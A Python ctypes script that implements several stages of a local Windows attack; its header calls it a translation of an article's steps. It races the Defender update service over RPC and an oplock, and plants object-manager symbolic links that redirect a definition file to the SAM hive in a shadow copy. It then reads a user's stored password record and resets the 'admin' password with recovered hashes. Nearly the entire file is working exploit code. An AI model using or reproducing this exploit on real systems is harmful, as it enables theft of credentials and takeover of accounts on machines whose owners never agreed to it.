# Static ctypes translation of the article's Stages 5-7, never invoked here.
# Native object attributes, worker state and recovered hashes are harness inputs.
import ctypes as C
from ctypes import wintypes as W

def update_race(staged, old_link, root, old_hash, new_hash, transaction):
    kernel = C.WinDLL("kernel32.dll")
    nt = C.WinDLL("ntdll.dll")
    rpc = C.WinDLL("rpcrt4.dll")
    offreg = C.WinDLL("offreg.dll")
    samlib = C.WinDLL("samlib.dll")
    binding_text = C.c_void_p()
    binding = C.c_void_p()
    rpc.RpcStringBindingComposeW("c503f532-443a-4c69-8300-ccd1fbdb3839", "ncalrpc", None,
        "IMpService77BDAF73-B396-481F-9042-AD358843EC24", None, C.byref(binding_text))
    rpc.RpcBindingFromStringBindingW(binding_text, C.byref(binding))
    # Wait for the procedure-42 update worker to reopen the definition file.
    class OVERLAPPED(C.Structure):
        _fields_ = [("Internal", C.c_size_t), ("InternalHigh", C.c_size_t),
                    ("Offset", W.DWORD), ("OffsetHigh", W.DWORD), ("hEvent", W.HANDLE)]
    overlapped = OVERLAPPED()
    overlapped.hEvent = kernel.CreateEventW(None, True, False, None)
    done = W.DWORD()
    kernel.DeviceIoControl(staged, 0x90008, None, 0, None, 0, C.byref(done), C.byref(overlapped))
    kernel.GetOverlappedResult(staged, C.byref(overlapped), C.byref(done), True)
    kernel.CloseHandle(old_link)
    update_name = "WDUpdateDirectory"
    directory = r"\Sessions\4\BaseNamedObjects\{aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee}"
    target = r"\??\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\System32\config\SAM"
    class UNICODE_STRING(C.Structure):
        _fields_ = [("Length", W.USHORT), ("MaximumLength", W.USHORT), ("Buffer", W.LPWSTR)]
    class OBJECT_ATTRIBUTES(C.Structure):
        _fields_ = [("Length", W.ULONG), ("RootDirectory", W.HANDLE),
                    ("ObjectName", C.POINTER(UNICODE_STRING)), ("Attributes", W.ULONG),
                    ("SecurityDescriptor", C.c_void_p), ("SecurityQualityOfService", C.c_void_p)]
    def native_string(value):
        return UNICODE_STRING(len(value) * 2, (len(value) + 1) * 2, value)
    directory_string, sam_string = native_string(directory), native_string(target)
    update_string, file_string = native_string(update_name), native_string("mpasbase.vdm")
    alias_attrs = OBJECT_ATTRIBUTES(C.sizeof(OBJECT_ATTRIBUTES), root, C.pointer(update_string), 64, None, None)
    file_attrs = OBJECT_ATTRIBUTES(C.sizeof(OBJECT_ATTRIBUTES), root, C.pointer(file_string), 64, None, None)
    link, file_link = W.HANDLE(), W.HANDLE()
    nt.NtCreateSymbolicLinkObject(C.byref(link), 0x10000000, C.byref(alias_attrs), C.byref(directory_string))
    nt.NtCreateSymbolicLinkObject(C.byref(file_link), 0x10000000, C.byref(file_attrs), C.byref(sam_string))
    kernel.CloseHandle(staged)
    leaked = kernel.CreateFileTransactedW(r"C:\staging\mpasbase.vdm", 0x80000000,
        1, None, 3, 0, None, transaction, None, None)
    hive, user = W.HANDLE(), W.HANDLE()
    offreg.OROpenHiveByHandle(leaked, C.byref(hive))
    offreg.OROpenKey(hive, r"SAM\Domains\Account\Users\000003E9", C.byref(user))
    record = C.create_string_buffer(4096)
    size, kind = W.DWORD(4096), W.DWORD()
    offreg.ORGetValue(user, None, "V", C.byref(kind), record, C.byref(size))
    samlib.SamiChangePasswordUser("admin", old_hash, new_hash)
